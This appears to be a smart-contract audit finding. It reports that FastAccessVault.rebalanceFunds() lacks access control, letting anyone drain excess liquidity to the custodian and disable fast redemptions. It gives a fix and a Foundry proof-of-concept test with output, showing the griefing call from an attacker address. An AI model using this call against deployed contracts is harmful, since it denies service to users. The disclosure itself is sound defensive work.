  "body": "## Finding description and impact\n\nThe function `FastAccessVault.rebalanceFunds()` is declared external with no access control.\nAny address (including malicious bots or griefers) can call it at any time.\nThis allows an attacker to force-drain all excess liquidity from the on-chain `FastAccessVault` to the off-chain custodian immediately after large mints, leaving only the exact target buffer (e.g. 5%) on-chain.\n\nResult:\nAll subsequent redemptions are forced onto the slow, manual, off-chain custodian path\nThe “fast redemption” feature that users rely on is effectively disabled until the issuer manually tops up the vault again\nUX is destroyed during high-volume periods or bank runs\n\nEven though no funds are stolen, this is a classic griefing / denial-of-service vector and violates the principle of least privilege.\n\n## Impact\n- Random EOAs should never be able to move protocol liquidity\n- Attacker drains buffer exactly when liquidity is needed most\n- Bot can spam `rebalanceFunds()` after every mint which kills fast redemptions\n- Users expect instant redemptions suddenly wait minutes/hours\n\n## Recommended mitigation steps\n\n```solidity\n// Add this modifier\nmodifier onlyIssuer() {\n    if (msg.sender != issuerContract) revert NotIssuer();\n    _;\n}\n\n// Change the function\nfunction rebalanceFunds() external onlyIssuer {\n    // existing logic unchanged\n}\n```\nAlternatively, if the team truly wants permissionless rebalancing (e.g. for keepers), at minimum add:\n- A cooldown (e.g. 1 hour between calls)\n- A minimum excess threshold (e.g. only if >10% above target)",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\nimport {FastAccessVault} from \"../src/protocol/FastAccessVault.sol\";\nimport {MockERC20} from \"./mocks/MockERC20.sol\";\n\ncontract MockIssuer {\n    uint256 public totalCollateralUnderCustody = 10_000_000e18; // 10M AUM\n\n    function getCollateralUnderCustody() external view returns (uint256) {\n        return totalCollateralUnderCustody;\n    }\n}\n\ncontract FastAccessVault_Griefing_POC is Test {\n    FastAccessVault vault;\n    MockERC20 token;\n    MockIssuer issuer;\n\n    address admin = address(0x1111);\n    address custodian = address(0x2222);\n    address attacker = address(0xBEEF);\n\n    function setUp() public {\n        vm.startPrank(admin);\n\n        token = new MockERC20(\"DLF\", \"DLF\");\n        issuer = new MockIssuer();\n\n        // Deploy vault: 5% target buffer (500 bps), min 50k\n        vault = new FastAccessVault(\n            address(token),\n            address(issuer),\n            custodian,\n            500,      // 5%\n            50_000e18,\n            admin\n        );\n\n        // Give vault 1M DLF (way above target of 500k for 10M AUM)\n        token.mint(address(vault), 1_000_000e18);\n\n        vm.stopPrank();\n    }\n\n    function test_AttackerCanCallRebalanceFunds_AndStealLiquidity() public {\n        uint256 target = (10_000_000e18 * 500) / 10_000; // 500_000e18\n        uint256 excess = 1_000_000e18 - target;         // 500_000e18\n\n        console.log(\"Before attack:\");\n        console.log(\"  Vault balance :\", token.balanceOf(address(vault)) / 1e18, \"DLF\");\n        console.log(\"  Target buffer :\", target / 1e18, \"DLF\");\n        console.log(\"  Excess        :\", excess / 1e18, \"DLF\");\n\n        // ANYONE can call this — even attacker\n        vm.prank(attacker);\n        vault.rebalanceFunds();\n\n        console.log(\"After attacker calls rebalanceFunds():\");\n        console.log(\"  Vault balance :\", token.balanceOf(address(vault)) / 1e18, \"DLF\");\n        console.log(\"  Custodian got :\", token.balanceOf(custodian) / 1e18, \"DLF\");\n\n        // Attacker didn't steal funds — but forced 500k DLF to custodian\n        assertEq(token.balanceOf(address(vault)), target, \"Vault should be exactly at target\");\n        assertEq(token.balanceOf(custodian), excess, \"Custodian received excess\");\n\n        // Now every redemption will hit slow custodian path — griefed!\n        console.log(\"Griefing successful: future redemptions now go through custodian\");\n    }\n\n}\n```\n\n**Test Output**\n\n```solidity\nhp@DESKTOP-TA4AU1O MINGW64 ~/2025-11-brix-money (main)\n$ forge test --match-contract FastAccessVault_Griefing_POC -vvv\n[⠢] Compiling...\n[⠊] Compiling 1 files with Solc 0.8.20\n[⠒] Solc 0.8.20 finished in 17.49s\nCompiler run successful!\n\nRan 1 test for test/FastAccessVault.t.sol:FastAccessVault_Griefing_POC\n[PASS] test_AttackerCanCallRebalanceFunds_AndStealLiquidity() (gas: 77793)\nLogs:\n  Before attack:\n    Vault balance : 1000000 DLF\n    Target buffer : 500000 DLF\n    Excess        : 500000 DLF\n  After attacker calls rebalanceFunds():\n    Vault balance : 500000 DLF\n    Custodian got : 500000 DLF\n  Griefing successful: future redemptions now go through custodian\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 130.65ms (25.78ms CPU time)\n\nRan 1 test suite in 265.66ms (130.65ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
